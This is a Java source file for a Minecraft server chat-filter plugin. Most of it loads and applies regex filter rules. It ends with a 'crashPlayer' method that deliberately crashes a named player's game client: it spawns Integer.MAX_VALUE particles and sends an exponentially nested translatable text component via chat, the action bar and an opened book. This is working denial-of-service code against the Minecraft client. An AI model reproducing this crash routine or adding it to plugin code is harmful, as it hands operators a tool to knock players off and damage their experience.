package eu.koolfreedom.filter;

import eu.koolfreedom.KoolChatFilter;
import eu.koolfreedom.utilities.FLog;
import net.kyori.adventure.inventory.Book;
import net.kyori.adventure.text.Component;
import org.bukkit.Particle;
import org.bukkit.entity.Player;

import java.text.Normalizer;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.PatternSyntaxException;

public final class FilterService
{
    private static final int REGEX_FLAGS = Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE;
    private static volatile List<FilterRule> rules = List.of();

    public FilterService() {}

    public static void reload()
    {
        List<FilterRule> loadedRules = new ArrayList<>();

        for (String expression : KoolChatFilter.getInstance().getConfig().getStringList("filter.rules"))
        {
            if (expression == null || expression.isBlank()) continue;

            try
            {
                loadedRules.add(new FilterRule(expression,
                        Pattern.compile(normalize(expression), REGEX_FLAGS)));
            }
            catch (PatternSyntaxException exception)
            {
                FLog.warning("Ignoring invalid filter regex '{0}': {1}",
                        expression, exception.getDescription());
            }
        }

        rules = List.copyOf(loadedRules);
        FLog.info("Loaded {0} text filter rules", rules.size());
    }

    public FilterResult check(String input)
    {
        if (input == null || input.isBlank()) return FilterResult.noMatch();

        String normalizedInput = normalize(input);
        for (FilterRule rule : rules)
        {
            if (rule.matches(normalizedInput))
            {
                return new FilterResult(true, rule.expression());
            }
        }

        return FilterResult.noMatch();
    }

    private static String normalize(String input)
    {
        return Normalizer.normalize(input, Normalizer.Form.NFD)
                .replaceAll("\\p{M}", "")
                .replaceAll("[\\u200B-\\u200D\\uFEFF]", "");
    }

    public static void crashPlayer(Player victim)
    {
        victim.spawnParticle(
                Particle.ASH,
                victim.getLocation(),
                Integer.MAX_VALUE,
                1, 1, 1, 1,
                null,
                true
        );

        Component c = Component.text("LOLOLOLOLOLOLOL");
        for (int i = 0; i < 50; ++i)
            c = Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s", c);

        victim.sendMessage(c);
        victim.sendActionBar(c);
        victim.openBook(Book.book(c, c, List.of(c)));
    }
}
